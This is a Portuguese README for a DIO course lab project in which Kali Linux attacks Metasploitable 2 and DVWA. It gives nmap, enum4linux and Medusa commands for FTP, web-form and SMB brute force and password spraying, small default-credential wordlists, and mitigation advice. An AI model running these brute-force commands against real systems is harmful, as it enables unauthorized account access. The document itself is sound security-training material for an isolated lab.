# Cibersegurança--Kali-linux-e-metasploitable
Em uma maquina virtual ( Virtual Box ) iremos usar o Kali linux + o metasploitable para fins acadêmicos em um estudo de Cibersegurança 


# Desafio de Projeto: Simulação de Ataque de Brute Force de Senhas com Medusa e Kali Linux

Documentação do projeto prático desenvolvido para o curso da **DIO (Digital Innovation One)**, simulando cenários reais de ataques de força bruta, password spraying e enumeração de serviços em ambiente virtualizado de laboratório.

---

## 📌 Descrição do Desafio

O objetivo deste projeto é implementar, documentar e compartilhar uma simulação prática de segurança ofensiva utilizando o **Kali Linux** e a ferramenta **Medusa**, em conjunto com máquinas e aplicações vulneráveis (**Metasploitable 2** e **DVWA**), exercitando tanto a execução dos ataques quanto a proposta de medidas de mitigação.

### Requisitos Cumpridos:
* **Ambiente Configurado:** Duas máquinas virtuais (Kali Linux e Metasploitable 2) no VirtualBox sob rede interna/host-only.
* **Ataques Simulados:** Força bruta no serviço FTP, automação de tentativas em formulário web (DVWA) e *password spraying* em SMB.
* **Enumeração de Serviços:** Uso de ferramentas de mapeamento e enumeração como Nmap e Enum4linux.
* **Validação de Acesso:** Confirmação de acessos válidos utilizando `smbclient` e login nos serviços.
* **Documentação & Mitigação:** Registro de comandos, wordlists e recomendações de segurança.

---

## 🧰 Ambiente e Ferramentas

* **Máquina Atacante:** Kali Linux
* **Máquina Alvo:** Metasploitable 2 (`IP: 192.168.56.10`)
* **Ferramentas:** `nmap`, `medusa`, `enum4linux`, `smbclient`, `printf`, `echo`, `less`.

---

## 🚀 Passo a Passo da Execução

### 1. Reconhecimento e Descoberta de Serviços (Nmap)

Identificação inicial das portas e serviços ativos na máquina alvo:

```bash
# Verificação de portas abertas (FTP, SSH, HTTP, SMB)
nmap -sV -p 21,22,80,445,139 192.168.56.10

# Teste manual de conexão no serviço FTP
ftp 192.168.56.10


------------------------------------------------------------
***2. Ataque de Força Bruta em FTP com Medusa***
------------------------------------------------------------
Criação das wordlists de usuários e senhas com quebra de linha limpa (printf) para evitar erros de formatação no Medusa:

# Criando lista de usuários possíveis
printf "msfadmin\nuser\nroot\n" > users.txt

# Criando lista de senhas possíveis
printf "msfadmin\n123456\npassword\nqwerty\n" > pass.txt

# Executando o Medusa no serviço FTP (porta 21)
medusa -h 192.168.56.10 -U users.txt -P pass.txt -M ftp -t 6

--------------------------------------------------------------
***3. Ataque de Força Bruta em Formulário Web (DVWA)***
Simulação de login brute force na aplicação web vulnerável DVWA (http://192.168.56.10/dvwa/login.php):

# Criando wordlists para o teste web
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt 
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

# Executando o Medusa com o módulo HTTP
medusa -h 192.168.56.10 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6


*** Resultado obtido: Credencial identificada com sucesso (admin / password).***
-------------------------------------------------------------------

***4. Enumeração SMB e Password Spraying***
Mapeamento do ambiente Windows/Samba e execução do ataque de Password Spraying:

# Enumeração do serviço SMB com enum4linux registrando a saída em arquivo
enum4linux -a 192.168.56.10 | tee enum4_output.txt

# Leitura da saída gerada
less enum4_output.txt

# Criando wordlists específicas para o teste em SMB
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nwelcome123\nmsfadmin" > senhas_spray.txt

# Executando o Medusa usando o módulo smbnt
medusa -h 192.168.56.10 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 5

----------------------------------------------------------------------------------------
***5. Validação de Acesso Utilizando Smbclient***
Confirmação do acesso e listagem de diretórios compartilhados com as credenciais obtidas (msfadmin):

smbclient -L //192.168.56.10 -U msfadmin

------------------------------------------------------------------------------------------
🛡️ Medidas de Mitigação e Prevenção
Para proteger os ambientes contra os ataques simulados neste projeto, recomendam-se as seguintes boas práticas:

Política de Senhas Fortes: Substituição de senhas padrão (msfadmin, admin, 123456) por combinações complexas (letras maiúsculas, minúsculas, números e símbolos).

Rate Limiting e Bloqueio de IP: Implementação de ferramentas como Fail2ban para monitorar logs de autenticação e bloquear IPs após consecutivas tentativas malsucedidas de login.

Múltiplo Fator de Autenticação (MFA): Adição de verificação em duas etapas para acesso a serviços críticos e painéis web de administração.

Desativação de Serviços Legados: Desabilitar protocolos desnecessários ou inseguros (como FTP sem TLS) e restringir o acesso a portas de gerenciamento via firewall.

=========================================================================================================================================================================

OBS: Todos os testes são para fins acadêmicos pela DIO cursos
